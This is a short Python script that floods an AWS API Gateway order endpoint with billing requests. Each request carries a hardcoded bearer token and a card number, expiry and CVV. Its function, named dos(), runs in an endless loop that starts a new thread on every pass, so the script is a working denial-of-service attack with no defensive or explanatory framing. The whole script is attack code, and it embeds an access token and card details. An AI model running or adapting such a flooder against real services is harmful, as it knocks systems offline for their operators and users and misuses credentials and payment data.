import threading
import requests

def dos():
    payload = '{ "action":"billing", "order-id": "ca07084f-4738-4087-983f-3c6be4330266", "data": {"ccn": "3553 5394 9455 6782", "exp": "10/29", "cvv": "410"} }'
    url = "https://f2ilpdqum2.execute-api.us-east-1.amazonaws.com/dev/order"
    headers = {"Authorization": "eyJraWQiOiJOWlNQYm90MWZGOGJ6ZGZxV3F6cFdDNGpwbCsxSFBEenkvcXBvcXRqeEhVPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI5NDg4MTRjOC0zMDQxLTcwYTktMzBhNi1iZWZkYTZiMGM4YzkiLCJpc3MiOiJodHRwczovL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL3VzLWVhc3QtMV9LdmNLQ01SUlEiLCJjbGllbnRfaWQiOiIzaDVobTVjM2wzb2Voa3B2dTdpNTBjNDQzdSIsIm9yaWdpbl9qdGkiOiJiMmMyMTJkMC1lODczLTRmMjQtYjQ1MS1hOWJjMjhkNWFlMjUiLCJldmVudF9pZCI6ImQ5ZTJhMzYzLTg0YzAtNGU5ZS1iMzEzLTM4ZmNhMzQxYjdkZiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Nzc4MjEzNzgsImV4cCI6MTc3NzgyNDk3OCwiaWF0IjoxNzc3ODIxMzc4LCJqdGkiOiI4YjlmOGMwZC0yOThjLTRmZGMtYjVkZC1jMGQ3NWIxZDk0NWQiLCJ1c2VybmFtZSI6Ijk0ODgxNGM4LTMwNDEtNzBhOS0zMGE2LWJlZmRhNmIwYzhjOSJ9.ii5W8E83nB7uN25Ei7hUsrwrHWh7wlChR95xBkHx0dVJvvjXlddVYOgG63KfWY37Bri6HcBD-vKZy44lYfmofk7CcjXizaGm1ZdQrSSG2BhMC9RemoCDyUBRBQzy9dxuAiYDnen3w3Hz6GCGOirHGHjB5-rtQL6CgLH6k98k_Lskrz5OLjQD81TfVQHuYMClaYvqtuAY8zqkWVuqi2n8fHQ0dBSesiQMieaNTl2tFpm5PkaAz3fCDQ839bzRcPYZPn02i7qa8hmNZ0n9DmoL-GLSnff4u-KGb1hLnc8boyCXbhGqA1d0BfeVAy8IHCg7G9MQ6CeEqDVyrbpXJclllg"}

    r = requests.post(url, data=payload, headers=headers)
    print (r.text)
    return


while True:
    threading.Thread(target=dos).start()
